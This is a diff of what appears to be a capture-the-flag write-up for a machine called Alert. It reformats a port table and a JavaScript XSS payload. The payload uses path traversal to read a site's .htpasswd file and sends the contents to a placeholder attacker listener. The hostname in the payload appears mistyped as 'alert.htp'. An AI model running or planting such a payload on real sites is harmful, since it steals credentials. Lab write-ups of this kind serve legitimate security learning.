@@ -7,8 +7,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
+| 22 | ssh |
+| 80 | http |
 
 We need to add `alert.htb` to `/etc/hosts` in order to access the website
 
@@ -36,10 +36,10 @@ The server basically processes the file with a function called `visualizer.php`,
 ```js
 <script>
 fetch("http://alert.htp/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
-  .then(response => response.text())
-  .then(data => {
-    fetch("http://IP:PORT/?file_content=" + encodeURIComponent(data));
-  });
+ .then(response => response.text())
+ .then(data => {
+ fetch("http://IP:PORT/?file_content=" + encodeURIComponent(data));
+ });
 </script>
 ```
 
